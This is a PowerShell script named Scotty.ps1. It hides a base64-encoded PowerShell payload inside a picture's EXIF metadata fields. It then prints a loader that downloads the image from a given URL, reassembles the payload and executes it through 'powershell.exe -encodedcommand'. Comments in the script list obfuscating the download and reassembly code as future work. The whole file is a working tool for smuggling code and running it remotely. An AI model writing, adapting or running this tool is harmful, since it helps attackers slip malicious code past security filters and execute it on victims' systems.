# TO DO: Include Usage Information
# TO DO: Obfuscate the image download and payload reassembly code.
# TO DO: Handle errors '-_-

# Parameter declaration

param (
	[Parameter(Mandatory=$false)][string]$WImagePath,
	[Parameter(Mandatory=$false)][string]$WImagePathNew,
	[Parameter(Mandatory=$false)][int32]$WIndexProperty,
	[Parameter(Mandatory=$false)][string]$ImageUrl,
	[Parameter(Mandatory=$false)][string]$WPayload
)

# Check if all parameters are provided and print usage information if not

if (!$PSBoundParameters.ContainsKey('WImagePath') -or !$PSBoundParameters.ContainsKey('WImagePathNew') -or !$PSBoundParameters.ContainsKey('WPayload'))
	{
		Write-Host 'Usage: Scotty.ps1 -WImagePath <source image> -WImagePathNew <destination image> -WPayLoad <Base 64 Payload> [-WIndexProperty <Property to store values> -ImageUrl <published image url>]'
		exit
	}

# Get the full path of the original image, as it will be needed when working with the image

$absOriginalImagePath = [System.IO.Path]::GetFullPath([System.IO.Path]::Combine($pwd, $WImagePath))

# Get the full path of the destination image, as it will be needed when saving the new image

$absNewImagePath = [System.IO.Path]::GetFullPath([System.IO.Path]::Combine($pwd, $WImagePathNew))

# Chunk size constant

$WPayloadChunkSize = 1000

# If an Index Property is not defined use the default property 293

if (!$PSBoundParameters.ContainsKey('WIndexProperty'))
	{
		$WIndexProperty = 293
	}

# List of properties available on the image.

[int32[]]$storageProperties = 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,254,255,256,257,258,259,262,263,264,265,266,269,270,271,272,273,274,277,278,279,280,281,282,283,284,285,286,287,288,289,290,291,292,293,296,297,301,305,306,315,316,317,318,319,320,321,322,323,324,325,332,333,334,336,337,338,339,340,341,342,512,515,517,518,519,520,521,529,530,531,532,769,770,771,800,20481,20482,20483,20484,20485,20486,20487,20488,20489,20490,20491,20492,20493,20494,20495,20496,20497,20498,20499,20500,20501,20502,20503,20504,20505,20506,20507,20517,20518,20519,20521,20525,20526,20528,20529,20530,20531,20532,20533,20534,20537,20539,20736,20737,20738,20739,20740,20752,20753,20754,20755,33432,33434,33437,34675,34850,34852,34855,34856,36864,36867,36868,37121,37122,37377,37378,37379,37380,37381,37382,37383,37384,37385,37386,37500,37520,37521,37522,40960,40961,40962,40963,40964,41483,41484,41486,41487,41488,41492,41493,41495,41728,41729,41730

If ($storageProperties -notcontains $WIndexProperty) {
	Write-Host 'The property ID provided in WIndexProperty is not an usable property ID'
	Exit
}

# If the chosen Index Property falls inside the storage, its ID is removed from the array.

$storageProperties = $storageProperties | Where-Object { $_ -ne $WIndexProperty }

# Get how many chunks will be needed for the payload

$totalPayloadChunks = [math]::floor($WPayload.Length / $WPayloadChunkSize)

#Identify if another, incomplete chunk, will be needed for the payload

if (($WPayload.Length % $WPayloadChunkSize) -eq 0)
	{
		$totalPayloadChunks--
	}

# Make sure that the payload will fit

If ($totalPayloadChunks -gt $storageProperties.count)
	{
		Write-Host 'Payload do not fit in the available properties. Please try to make the payload smaller.'
		exit
	}

# Choose randomly the first property to store the payload

$startingProperty = $storageProperties[(Get-Random -Maximum ($storageProperties.count - $totalPayloadChunks -1))]

# Set the property list that will store the payload

$lastProperty = $storageProperties[($storageProperties.IndexOf($startingProperty) + $totalPayloadChunks)]

$payloadProperties = @()

For ($i = $storageProperties.IndexOf($startingProperty); $i -le $storageProperties.IndexOf($lastProperty); $i++)
	{
		$payloadProperties += $storageProperties[$i]
	}

$payloadPropertiesCSV = $payloadProperties -join ','

# Load the .net GDI+ image library to work with images

Add-Type -AssemblyName system.drawing 

# Load the image

$absOriginalImagePath = (Get-Item $WImagePath).FullName
$WImage = New-Object -TypeName system.drawing.bitmap -ArgumentList $absOriginalImagePath

# Find any property in the image to use as base

If ($WImage.PropertyIdList.Count -lt 1)
	{
		Write-Host 'File does not have any EXIF information (Weird!) please add an EXIF property to the image or use a different file.'
		exit
	}

$WImageBaseProperty = $WImage.GetPropertyItem($WImage.PropertyIdList[0])

# We will store the strings with unicode codification, so we instantiate an Unicode encoder and set our Base property type to Unicode.

$encoder = new-object System.Text.UnicodeEncoding
$WImageBaseProperty.Type = 3

# Save the list of properties that will contain the payload chunks in the property id specified on the parameters or the default one if not specified (293)

$WImageEncodedString = $encoder.Getbytes($payloadPropertiesCSV)

$WImageBaseProperty.Id = $WIndexProperty
$WImageBaseProperty.Value = $WImageEncodedString
$WImageBaseProperty.Len = $WImageEncodedString.Length

$WImage.SetPropertyItem($WImageBaseProperty)

# Write the payload to the image

foreach ($propertyId in $payloadProperties)
	{
		If ($propertyId -eq $lastProperty)
			{
				$WPayloadChunkStart = $WPayloadChunkSize * ($totalPayloadChunks)
				$WPayloadChunkSize = $WPAyload.Length - $WPayloadChunkStart
				$WPayloadChunk = $WPayload.Substring($WPayloadChunkStart, $WPayloadChunkSize)
				$WImageEncodedString = $encoder.Getbytes($WPayloadChunk)

				$WImageBaseProperty.Id = $propertyId
				$WImageBaseProperty.Value = $WImageEncodedString
				$WImageBaseProperty.Len = $WImageEncodedString.Length
				
				$WImage.SetPropertyItem($WImageBaseProperty)
			}
		else
			{
				$WPayloadChunkStart = $payloadProperties.IndexOf($propertyId) * $WPayloadChunkSize
				$WPayloadChunk = $WPayload.Substring($WPayloadChunkStart, $WPayloadChunkSize)
				$WImageEncodedString = $encoder.Getbytes($WPayloadChunk)

				$WImageBaseProperty.Id = $propertyId
				$WImageBaseProperty.Value = $WImageEncodedString
				$WImageBaseProperty.Len = $WImageEncodedString.Length
				
				$WImage.SetPropertyItem($WImageBaseProperty)
			}
		
	}
	
# Save the image to disk

$WImage.Save($absNewImagePath)
$WImage.Dispose()

# Generate the base64 code

$ImageDownloadCode = '
Add-Type -AssemblyName system.drawing
$request = Invoke-WebRequest -UseBasicParsing -Uri ' + $ImageUrl + '
[byte[]]$imagebytes = $request.Content
$Image  = [System.Drawing.Image]::FromStream([System.IO.MemoryStream]$imagebytes)
$storagePropertiesValue  = [System.Text.Encoding]::Unicode.GetString($image.GetPropertyItem(' + $WIndexProperty + ').Value)
[int32[]]$storageProperties = $storagePropertiesValue.Split(",")
$PocString = ""
foreach ($property in $storageProperties)
	{
		$ImageProperty = $Image.GetPropertyItem($property)
		$PocString = $PocString + [System.Text.Encoding]::Unicode.GetString($ImageProperty.Value)
	}
$Image.Dispose()
powershell.exe -noexit -encodedcommand $PocString'

$ImageDownloadCodeBytes = $encoder.GetBytes($ImageDownloadCode)
$ImageDownloadCodeB64 = [Convert]::ToBase64String($ImageDownloadCodeBytes)

# Done! Print the information

Write-Host 'Image is Ready! Download and execute the payload with the following code:'

$ImageDownloadCode